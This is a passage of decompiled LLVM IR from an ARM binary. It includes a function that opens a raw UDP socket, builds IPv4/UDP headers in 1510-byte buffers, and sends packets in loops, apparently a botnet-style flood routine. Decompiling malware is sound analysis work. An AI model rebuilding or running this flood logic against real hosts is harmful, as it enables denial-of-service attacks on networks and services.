dec_label_pc_de18:                                ; preds = %dec_label_pc_de10
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %dec_label_pc_de20, %dec_label_pc_de18
  %v0_de28 = phi i32 [ %v1_de28, %dec_label_pc_de20 ], [ 0, %dec_label_pc_de18 ]
  %v0_de20 = phi i32 [ %v1_de3c, %dec_label_pc_de20 ], [ 0, %dec_label_pc_de18 ]
  %v1_de20 = load i32, i32* @sb, align 4
  %v2_de20 = add i32 %v1_de20, %v0_de20
  %v3_de20 = inttoptr i32 %v2_de20 to i32*
  %v4_de20 = load i32, i32* %v3_de20, align 4
  %v1_de24 = load i32, i32* @sl, align 4
  %v2_de24 = add i32 %v1_de24, %v0_de20
  %v3_de24 = inttoptr i32 %v2_de24 to i32*
  %v4_de24 = load i32, i32* %v3_de24, align 4
  store i32 %v4_de24, i32* %r1.global-to-local, align 4
  %v1_de28 = add i32 %v0_de28, 1
  store i32 %v1_de28, i32* %r5.global-to-local, align 4
  %v0_de2c = load i32, i32* @r6, align 4
  %v4_de34 = call i32 @_send(i32 %v4_de20, i32 %v4_de24, i32 %v0_de2c, i32 16384)
  %v1_de38 = load i32, i32* @r7, align 4
  %v9_de38 = icmp eq i32 %v1_de28, %v1_de38
  %v0_de3c = load i32, i32* %r4.global-to-local, align 4
  %v1_de3c = add i32 %v0_de3c, 4
  store i32 %v1_de3c, i32* %r4.global-to-local, align 4
  br i1 %v9_de38, label %dec_label_pc_de44.loopexit, label %dec_label_pc_de20

dec_label_pc_de44.loopexit:                       ; preds = %dec_label_pc_de20
  %tmp4247 = icmp slt i32 %v1_de28, 1
  br i1 %tmp4247, label %dec_label_pc_de0c, label %dec_label_pc_de10.lr.ph

dec_label_pc_de10.lr.ph:                          ; preds = %dec_label_pc_de44.preheader, %dec_label_pc_de44.loopexit
  br label %dec_label_pc_de10

dec_label_pc_de48.loopexit:                       ; preds = %dec_label_pc_de60
  %tmp42 = icmp slt i32 %v0_de88, 1
  br i1 %tmp42, label %dec_label_pc_de0c, label %dec_label_pc_de10

dec_label_pc_de50:                                ; preds = %dec_label_pc_dcec
  store i32 %v3_dbb4, i32* %r4.global-to-local, align 4
  store i32 %v6_dbb4, i32* %r5.global-to-local, align 4
  store i32 %v24_dbb4, i32* %fp.global-to-local, align 4
  ret i32 %v3_dd04

dec_label_pc_de58:                                ; preds = %dec_label_pc_de10
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de60, %dec_label_pc_de58
  %v0_de60 = phi i32 [ %v1_de8c, %dec_label_pc_de60 ], [ 0, %dec_label_pc_de58 ]
  %v1_de60 = load i32, i32* @sl, align 4
  %v2_de60 = add i32 %v1_de60, %v0_de60
  %v3_de60 = inttoptr i32 %v2_de60 to i32*
  %v4_de60 = load i32, i32* %v3_de60, align 4
  store i32 %v4_de60, i32* @r4, align 4
  %v0_de64 = load i32, i32* @r6, align 4
  store i32 %v0_de64, i32* @r1, align 4
  %v1_de6c = inttoptr i32 %v4_de60 to i8*
  %v2_de6c = call i32 @function_10db4(i8* %v1_de6c)
  %v0_de70 = load i32, i32* @r5, align 4
  %v1_de70 = add i32 %v0_de70, 1
  store i32 %v1_de70, i32* @r5, align 4
  %v0_de74 = load i32, i32* @fp, align 4
  %v1_de74 = load i32, i32* @sb, align 4
  %v2_de74 = add i32 %v1_de74, %v0_de74
  %v3_de74 = inttoptr i32 %v2_de74 to i32*
  %v4_de74 = load i32, i32* %v3_de74, align 4
  %v0_de78 = load i32, i32* @r4, align 4
  store i32 %v0_de78, i32* %r1.global-to-local, align 4
  %v0_de7c = load i32, i32* @r6, align 4
  %v4_de84 = call i32 @_send(i32 %v4_de74, i32 %v0_de78, i32 %v0_de7c, i32 16384)
  %v0_de88 = load i32, i32* @r5, align 4
  %v1_de88 = load i32, i32* @r7, align 4
  %v9_de88 = icmp eq i32 %v0_de88, %v1_de88
  %v0_de8c = load i32, i32* @fp, align 4
  %v1_de8c = add i32 %v0_de8c, 4
  store i32 %v1_de8c, i32* @fp, align 4
  br i1 %v9_de88, label %dec_label_pc_de48.loopexit, label %dec_label_pc_de60

; uselistorder directives
  uselistorder i32 %v1_de8c, { 1, 0 }
  uselistorder i32 %v0_de88, { 1, 0 }
  uselistorder i32 %v1_de3c, { 1, 0 }
  uselistorder i32 %v1_de28, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v0_ddac, { 1, 0 }
  uselistorder i32 %v8_dd7c, { 1, 2, 0 }
  uselistorder i32 %v3_dd54, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v3_dd04, { 1, 2, 0 }
  uselistorder i32 %v1_dcf4, { 1, 2, 0 }
  uselistorder i32 %v3_dc5c, { 0, 2, 1 }
  uselistorder i32 %v3_dc0c, { 0, 2, 1 }
  uselistorder i32 %v1_dbb8, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 10, 11, 3, 4, 5, 6, 7, 8, 9, 12, 13, 15, 14, 16, 18, 17, 0 }
  uselistorder label %dec_label_pc_de10.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_de10, { 1, 0 }
  uselistorder label %dec_label_pc_de0c, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_dda0, { 1, 0 }
  uselistorder label %dec_label_pc_dc98, { 1, 0 }
}

define i32 @function_de9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de9c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_de9c = load i32, i32* @r4, align 4
  %v6_de9c = load i32, i32* @r5, align 4
  %v9_de9c = load i32, i32* @r6, align 4
  %v12_de9c = load i32, i32* @r7, align 4
  %v18_de9c = load i32, i32* @sb, align 4
  %v24_de9c = load i32, i32* @fp, align 4
  %v1_dea0 = urem i32 %arg1, 256
  store i32 %v1_dea0, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_dea0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_deb8 = urem i32 %arg3, 256
  store i32 %v1_deb8, i32* @r4, align 4
  %v2_debc = call i32 @_calloc(i32 %v1_dea0, i32 4)
  %v0_dec0 = load i32, i32* @r5, align 4
  store i32 %v0_dec0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ded0 = load i32, i32* @r4, align 4
  store i32 %v0_ded0, i32* %r0.global-to-local, align 4
  %v5_ded4 = inttoptr i32 %v0_dec0 to i32*
  %v6_ded4 = call i32 @function_b240(i32 %v0_ded0, i32* %v5_ded4, i32 2, i32 0)
  %v1_dee0 = urem i32 %v6_ded4, 256
  store i32 %v1_dee0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_deec = load i32, i32* @r5, align 4
  store i32 %v0_deec, i32* %r1.global-to-local, align 4
  %v0_def0 = load i32, i32* @r4, align 4
  store i32 %v0_def0, i32* %r0.global-to-local, align 4
  %v5_def4 = trunc i32 %v6_ded4 to i8
  %v6_def8 = inttoptr i32 %v0_deec to i32*
  %v7_def8 = call i32 @function_b240(i32 %v0_def0, i32* %v6_def8, i32 3, i32 65535)
  %v0_defc = load i32, i32* @r5, align 4
  store i32 %v0_defc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_def8, i32* %fp.global-to-local, align 4
  %v0_df0c = load i32, i32* @r4, align 4
  store i32 %v0_df0c, i32* %r0.global-to-local, align 4
  %v4_df10 = inttoptr i32 %v0_defc to i32*
  %v5_df10 = call i32 @function_b240(i32 %v0_df0c, i32* %v4_df10, i32 4, i32 64)
  %v1_df18 = urem i32 %v5_df10, 256
  store i32 %v1_df18, i32* %ip.global-to-local, align 4
  %v0_df1c = load i32, i32* @r5, align 4
  store i32 %v0_df1c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_df28 = load i32, i32* @r4, align 4
  store i32 %v0_df28, i32* %r0.global-to-local, align 4
  %v5_df2c = trunc i32 %v5_df10 to i8
  %v6_df30 = inttoptr i32 %v0_df1c to i32*
  %v7_df30 = call i32 @function_b240(i32 %v0_df28, i32* %v6_df30, i32 5, i32 0)
  %v1_df3c = urem i32 %v7_df30, 256
  store i32 %v1_df3c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_df48 = load i32, i32* @r5, align 4
  store i32 %v0_df48, i32* %r1.global-to-local, align 4
  %v0_df4c = load i32, i32* @r4, align 4
  store i32 %v0_df4c, i32* %r0.global-to-local, align 4
  %v5_df54 = inttoptr i32 %v0_df48 to i32*
  %v6_df54 = call i32 @function_b240(i32 %v0_df4c, i32* %v5_df54, i32 6, i32 65535)
  %v0_df5c = load i32, i32* @r5, align 4
  store i32 %v0_df5c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_df54, i32* @r7, align 4
  %v0_df6c = load i32, i32* @r4, align 4
  store i32 %v0_df6c, i32* %r0.global-to-local, align 4
  %v4_df70 = inttoptr i32 %v0_df5c to i32*
  %v5_df70 = call i32 @function_b240(i32 %v0_df6c, i32* %v4_df70, i32 7, i32 65535)
  %v0_df74 = load i32, i32* @r5, align 4
  store i32 %v0_df74, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_df70, i32* %sb.global-to-local, align 4
  %v0_df84 = load i32, i32* @r4, align 4
  store i32 %v0_df84, i32* %r0.global-to-local, align 4
  %v4_df88 = inttoptr i32 %v0_df74 to i32*
  %v5_df88 = call i32 @function_b240(i32 %v0_df84, i32* %v4_df88, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_df94 = load i32, i32* @r5, align 4
  store i32 %v0_df94, i32* %r1.global-to-local, align 4
  store i32 %v5_df88, i32* @r6, align 4
  %v0_df9c = load i32, i32* @r4, align 4
  store i32 %v0_df9c, i32* %r0.global-to-local, align 4
  %v4_dfa0 = inttoptr i32 %v0_df94 to i32*
  %v5_dfa0 = call i32 @function_b240(i32 %v0_df9c, i32* %v4_dfa0, i32 1, i32 1)
  %v2_dfac = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_dfac, i32* %r3.global-to-local, align 4
  %v1_dfb0 = urem i32 %v5_dfa0, 256
  store i32 %v1_dfb0, i32* %ip.global-to-local, align 4
  %v0_dfb4 = load i32, i32* @r5, align 4
  store i32 %v0_dfb4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_dfbc = load i32, i32* @r4, align 4
  store i32 %v0_dfbc, i32* %r0.global-to-local, align 4
  %v5_dfc4 = inttoptr i32 %v0_dfb4 to i32*
  %v6_dfc4 = call i32 @function_b240(i32 %v0_dfbc, i32* %v5_dfc4, i32 25, i32 %v2_dfac)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_dfd8 = call i32 @_socket(i32 2, i32 3, i32 17)
  store i32 %v3_dfd8, i32* %r0.global-to-local, align 4
  %v7_dfdc = icmp eq i32 %v3_dfd8, -1
  store i1 %v7_dfdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dfdc, label %dec_label_pc_e404, label %dec_label_pc_dfe8

dec_label_pc_dfe8:                                ; preds = %dec_label_pc_de9c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_dff0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_dff0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_e004 = call i32 @_setsockopt()
  store i32 %v0_e004, i32* %r0.global-to-local, align 4
  %v7_e008 = icmp eq i32 %v0_e004, -1
  store i1 %v7_e008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e008, label %dec_label_pc_e3fc, label %dec_label_pc_e010

dec_label_pc_e010:                                ; preds = %dec_label_pc_dfe8
  %v0_e010 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_e01c = urem i32 %v0_e010, 65536
  store i32 %v3_e01c, i32* %r2.global-to-local, align 4
  %v3_e020 = icmp ugt i32 %v3_e01c, 1459
  %v9_e020 = icmp eq i32 %v3_e01c, 1460
  store i1 %v9_e020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e020, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_e010
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_e010, %bb
  %v0_e028 = phi i32 [ %v3_e01c, %dec_label_pc_e010 ], [ 1460, %bb ]
  %v0_e02c = load i32, i32* @r7, align 4
  %v3_e02c = mul i32 %v0_e02c, 65536
  store i32 %v3_e02c, i32* %r7.global-to-local, align 4
  %v3_e030 = urem i32 %v0_e02c, 65536
  store i32 %v3_e030, i32* %r3.global-to-local, align 4
  %v0_e034 = load i32, i32* @sl, align 4
  %v2_e034 = icmp eq i32 %v0_e034, 0
  store i1 %v2_e034, i1* %cpsr_z.global-to-local, align 1
  %v0_e038 = load i32, i32* %fp.global-to-local, align 4
  %v3_e038 = mul i32 %v0_e038, 65536
  store i32 %v3_e038, i32* %r0.global-to-local, align 4
  %v0_e03c = load i32, i32* %sb.global-to-local, align 4
  %v3_e03c = mul i32 %v0_e03c, 65536
  store i32 %v3_e03c, i32* %r5.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_e034, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_e028, i32* %r3.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_e064 = phi i32 [ %v3_e030, %bb71 ], [ %v0_e028, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e04c = urem i32 %v0_e038, 65536
  store i32 %v3_e04c, i32* %r2.global-to-local, align 4
  %v3_e050 = urem i32 %v0_e03c, 65536
  store i32 %v3_e050, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_e06c

.thread:                                          ; preds = %bb74
  %v6_e060 = add nsw i32 %v5_e064, 28
  store i32 %v6_e060, i32* @fp, align 4
  %v6_e064 = add nsw i32 %v5_e064, 8
  store i32 %v6_e064, i32* @sb, align 4
  br label %dec_label_pc_e1e0

dec_label_pc_e06c:                                ; preds = %bb74
  %v1_e070 = add nuw nsw i32 %v0_e028, 28
  store i32 %v1_e070, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_e070, 256
  %v1_e07c = and i32 %tmp75, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp76 = udiv i32 %v0_e038, 256
  %v3_e080 = urem i32 %tmp76, 256
  %v2_e094 = icmp eq i32 %v1_df3c, 0
  store i1 %v2_e094, i1* %cpsr_z.global-to-local, align 1
  %v1_e098 = urem i32 %v0_e038, 256
  %v1_e0a0 = add nuw nsw i32 %v0_e028, 8
  store i32 %v1_e0a0, i32* @sb, align 4
  %v3_e0a4 = mul i32 %v1_e0a0, 65536
  store i32 %v3_e0a4, i32* %r6.global-to-local, align 4
  %v1_e0a8 = urem i32 %v0_e02c, 256
  %v1_e0ac = urem i32 %v0_e03c, 256
  store i32 %v1_e0ac, i32* %ip.global-to-local, align 4
  store i32 %v1_e07c, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_e0a0, 256
  %v4_e0b8 = mul nuw nsw i32 %v1_e098, 256
  %v5_e0b8 = or i32 %v4_e0b8, %v3_e080
  store i32 %v5_e0b8, i32* %r0.global-to-local, align 4
  %v3_e0bc = mul nuw nsw i32 %v1_e0a8, 256
  store i32 %v3_e0bc, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_e03c, 256
  %v3_e0c0 = urem i32 %tmp78, 256
  %v1_e0c4 = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  store i32 %v1_e0c4, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_e070, 256
  %tmp80 = udiv i32 %v0_e02c, 256
  %v4_e0cc = urem i32 %tmp80, 256
  %v5_e0cc = or i32 %v4_e0cc, %v3_e0bc
  store i32 %v5_e0cc, i32* %r4.global-to-local, align 4
  %v5_e0d0 = trunc i32 %tmp79 to i8
  %v5_e0d4 = trunc i32 %tmp76 to i8
  %v4_e0d8 = mul nuw nsw i32 %v1_e0ac, 256
  %v5_e0d8 = or i32 %v4_e0d8, %v3_e0c0
  store i32 %v5_e0d8, i32* %r5.global-to-local, align 4
  %tmp81 = udiv i32 %v1_e0a0, 256
  %v4_e0dc = urem i32 %tmp81, 256
  %v5_e0dc = or i32 %v4_e0dc, %v1_e0c4
  store i32 %v5_e0dc, i32* %r7.global-to-local, align 4
  br i1 %v2_e094, label %dec_label_pc_e0e4, label %dec_label_pc_e40c

dec_label_pc_e0e4:                                ; preds = %dec_label_pc_e06c
  %v3_e0e436 = udiv i32 %v1_e07c, 256
  store i32 %v3_e0e436, i32* %ip.global-to-local, align 4
  store i32 %v1_e098, i32* %r0.global-to-local, align 4
  store i32 %v1_e0a8, i32* %r1.global-to-local, align 4
  store i32 %v1_e0ac, i32* %r2.global-to-local, align 4
  %v3_e0f437 = udiv i32 %v1_e0c4, 256
  store i32 %v3_e0f437, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_e158 = sext i8 %v5_def4 to i32
  %v4_e198 = sext i8 %v5_e0d4 to i32
  %sext15 = mul i32 %v0_e038, 16777216
  %v4_e19c = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_e02c, 16777216
  %v4_e1b4 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_e0c4, 65536
  %v4_e1b8 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_e03c, 16777216
  %v4_e1bc = sdiv i32 %sext18, 16777216
  %v1_e1a4 = trunc i32 %v3_e0e436 to i8
  %v1_e1c4 = trunc i32 %v4_e1b8 to i8
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e110, %dec_label_pc_e0e4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e11c = call i32 @_calloc(i32 1510, i32 1)
  store i32 %v2_e11c, i32* %r0.global-to-local, align 4
  store i32 %v2_debc, i32* %ip.global-to-local, align 4
  %v3_e124 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e124, i32* %r2.global-to-local, align 4
  %v2_e128 = load i32, i32* %r6.global-to-local, align 4
  %v5_e128 = mul i32 %v2_e128, 4
  %v6_e128 = add i32 %v5_e128, %v2_debc
  %v7_e128 = inttoptr i32 %v6_e128 to i32*
  store i32 %v2_e11c, i32* %v7_e128, align 4
  %v0_e12c = load i32, i32* %ip.global-to-local, align 4
  %v1_e12c = load i32, i32* %r2.global-to-local, align 4
  %v4_e12c = mul i32 %v1_e12c, 4
  %v5_e12c = add i32 %v4_e12c, %v0_e12c
  %v6_e12c = inttoptr i32 %v5_e12c to i32*
  %v7_e12c = load i32, i32* %v6_e12c, align 4
  store i32 %v7_e12c, i32* %r1.global-to-local, align 4
  %v1_e130 = inttoptr i32 %v7_e12c to i8*
  %v2_e130 = load i8, i8* %v1_e130, align 1
  %tmp = urem i8 %v2_e130, 16
  %v1_e134 = zext i8 %tmp to i32
  %v1_e138 = or i32 %v1_e134, 64
  store i32 %v1_e138, i32* %r3.global-to-local, align 4
  %v1_e13c = trunc i32 %v1_e138 to i8
  store i8 %v1_e13c, i8* %v1_e130, align 1
  %v0_e140 = load i32, i32* %r1.global-to-local, align 4
  %v1_e140 = inttoptr i32 %v0_e140 to i8*
  %v2_e140 = load i8, i8* %v1_e140, align 1
  %v3_e140 = zext i8 %v2_e140 to i32
  %v1_e144 = and i32 %v3_e140, 240
  %v1_e148 = or i32 %v1_e144, 5
  store i32 %v1_e148, i32* %r2.global-to-local, align 4
  %v3_e150 = add i32 %v0_e140, 9
  %v4_e150 = inttoptr i32 %v3_e150 to i8*
  store i8 17, i8* %v4_e150, align 1
  %v0_e154 = load i32, i32* %r2.global-to-local, align 4
  %v1_e154 = trunc i32 %v0_e154 to i8
  %v2_e154 = load i32, i32* %r1.global-to-local, align 4
  %v3_e154 = inttoptr i32 %v2_e154 to i8*
  store i8 %v1_e154, i8* %v3_e154, align 1
  store i32 %v4_e158, i32* %r0.global-to-local, align 4
  %v2_e15c = load i32, i32* %r1.global-to-local, align 4
  %v3_e15c = add i32 %v2_e15c, 1
  %v4_e15c = inttoptr i32 %v3_e15c to i8*
  store i8 %v5_def4, i8* %v4_e15c, align 1
  %v2_e164 = load i32, i32* %r1.global-to-local, align 4
  %v3_e164 = add i32 %v2_e164, 8
  %v4_e164 = inttoptr i32 %v3_e164 to i8*
  store i8 %v5_df2c, i8* %v4_e164, align 1
  %v3_e168 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e168, i32* %r2.global-to-local, align 4
  store i32 %v6_dfc4, i32* %ip.global-to-local, align 4
  %v3_e170 = mul i32 %v3_e168, 32
  store i32 %v3_e170, i32* %r3.global-to-local, align 4
  %v1_e174 = load i32, i32* %r1.global-to-local, align 4
  %v2_e174 = add i32 %v1_e174, 12
  %v3_e174 = inttoptr i32 %v2_e174 to i32*
  store i32 %v6_dfc4, i32* %v3_e174, align 4
  %v0_e178 = load i32, i32* %r3.global-to-local, align 4
  %v1_e178 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_e178, -8
  %v5_e178 = add i32 %v0_e178, %tmp84
  %v1_e17c = load i32, i32* @r8, align 4
  %v2_e17c = add i32 %v5_e178, %v1_e17c
  store i32 %v2_e17c, i32* %r3.global-to-local, align 4
  %v1_e180 = add i32 %v2_e17c, 16
  %v2_e180 = inttoptr i32 %v1_e180 to i32*
  %v3_e180 = load i32, i32* %v2_e180, align 4
  %v1_e184 = load i32, i32* %r1.global-to-local, align 4
  %v2_e184 = add i32 %v1_e184, 16
  %v3_e184 = inttoptr i32 %v2_e184 to i32*
  store i32 %v3_e180, i32* %v3_e184, align 4
  %v0_e18c = load i32, i32* %r2.global-to-local, align 4
  %v1_e18c = add i32 %v0_e18c, 1
  store i32 %v1_e18c, i32* %r6.global-to-local, align 4
  %v2_e190 = load i32, i32* %r1.global-to-local, align 4
  %v3_e190 = add i32 %v2_e190, 2
  %v4_e190 = inttoptr i32 %v3_e190 to i8*
  store i8 %v5_e0d0, i8* %v4_e190, align 1
  store i32 %v4_e198, i32* %ip.global-to-local, align 4
  store i32 %v4_e19c, i32* %r0.global-to-local, align 4
  %v0_e1a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_e1a0 = add i32 %v0_e1a0, 20
  store i32 %v1_e1a0, i32* %r3.global-to-local, align 4
  %v3_e1a4 = add i32 %v0_e1a0, 3
  %v4_e1a4 = inttoptr i32 %v3_e1a4 to i8*
  store i8 %v1_e1a4, i8* %v4_e1a4, align 1
  %v0_e1a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1a8 = trunc i32 %v0_e1a8 to i8
  %v2_e1a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e1a8 = add i32 %v2_e1a8, 4
  %v4_e1a8 = inttoptr i32 %v3_e1a8 to i8*
  store i8 %v1_e1a8, i8* %v4_e1a8, align 1
  %v0_e1ac = load i32, i32* %r0.global-to-local, align 4
  %v1_e1ac = trunc i32 %v0_e1ac to i8
  %v2_e1ac = load i32, i32* %r1.global-to-local, align 4
  %v3_e1ac = add i32 %v2_e1ac, 5
  %v4_e1ac = inttoptr i32 %v3_e1ac to i8*
  store i8 %v1_e1ac, i8* %v4_e1ac, align 1
  %v0_e1b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e1b0 = trunc i32 %v0_e1b0 to i8
  %v2_e1b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e1b0 = add i32 %v2_e1b0, 20
  %v4_e1b0 = inttoptr i32 %v3_e1b0 to i8*
  store i8 %v1_e1b0, i8* %v4_e1b0, align 1
  store i32 %v4_e1b4, i32* %r2.global-to-local, align 4
  store i32 %v4_e1b8, i32* %r1.global-to-local, align 4
  store i32 %v4_e1bc, i32* %ip.global-to-local, align 4
  %v0_e1c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_e1c0 = load i32, i32* @sl, align 4
  %v9_e1c0 = icmp eq i32 %v0_e1c0, %v1_e1c0
  store i1 %v9_e1c0, i1* %cpsr_z.global-to-local, align 1
  %v2_e1c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1c4 = add i32 %v2_e1c4, 5
  %v4_e1c4 = inttoptr i32 %v3_e1c4 to i8*
  store i8 %v1_e1c4, i8* %v4_e1c4, align 1
  %v0_e1c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e1c8 = trunc i32 %v0_e1c8 to i8
  %v2_e1c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1c8 = add i32 %v2_e1c8, 1
  %v4_e1c8 = inttoptr i32 %v3_e1c8 to i8*
  store i8 %v1_e1c8, i8* %v4_e1c8, align 1
  %v0_e1cc = load i32, i32* %r5.global-to-local, align 4
  %v1_e1cc = trunc i32 %v0_e1cc to i8
  %v2_e1cc = load i32, i32* %r3.global-to-local, align 4
  %v3_e1cc = add i32 %v2_e1cc, 2
  %v4_e1cc = inttoptr i32 %v3_e1cc to i8*
  store i8 %v1_e1cc, i8* %v4_e1cc, align 1
  %v0_e1d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1d0 = trunc i32 %v0_e1d0 to i8
  %v2_e1d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1d0 = add i32 %v2_e1d0, 3
  %v4_e1d0 = inttoptr i32 %v3_e1d0 to i8*
  store i8 %v1_e1d0, i8* %v4_e1d0, align 1
  %v0_e1d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e1d4 = trunc i32 %v0_e1d4 to i8
  %v2_e1d4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1d4 = add i32 %v2_e1d4, 4
  %v4_e1d4 = inttoptr i32 %v3_e1d4 to i8*
  store i8 %v1_e1d4, i8* %v4_e1d4, align 1
  %v0_e1d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e1d8, i32* %stack_var_-40, align 4
  %v5_e1dc = icmp slt i32 %v0_e1c0, %v1_e1c0
  br i1 %v5_e1dc, label %dec_label_pc_e110, label %dec_label_pc_e1e0

dec_label_pc_e1e0:                                ; preds = %dec_label_pc_e440, %dec_label_pc_e110, %.thread
  %v0_e1e0 = load i32, i32* @sl, align 4
  %v2_e1e0 = icmp eq i32 %v0_e1e0, 0
  store i1 %v2_e1e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e38c = icmp eq i32 %v3_e04c, 65535
  %v2_e258 = icmp eq i32 %v1_dfb0, 0
  %v2_e220 = icmp eq i32 %v6_dfc4, -1
  %v7_e220 = icmp eq i32 %v6_dfc4, -1
  br label %dec_label_pc_e1e8.outer

dec_label_pc_e1e8.outer:                          ; preds = %dec_label_pc_e308, %dec_label_pc_e1e0
  %v1_e1e8.ph.in = phi i32 [ %v1_e2fc, %dec_label_pc_e308 ], [ %v0_e1e0, %dec_label_pc_e1e0 ]
  %v0_e1e8.ph = phi i1 [ %v2_e308, %dec_label_pc_e308 ], [ %v2_e1e0, %dec_label_pc_e1e0 ]
  %v1_e1e8.ph = icmp slt i32 %v1_e1e8.ph.in, 0
  %v4_e1e8 = or i1 %v1_e1e8.ph, %v0_e1e8.ph
  br label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1e8.outer, %dec_label_pc_e1e8
  br i1 %v4_e1e8, label %dec_label_pc_e1e8, label %dec_label_pc_e1ec

dec_label_pc_e1ec:                                ; preds = %dec_label_pc_e1e8
  store i32 0, i32* %stack_var_-40, align 4
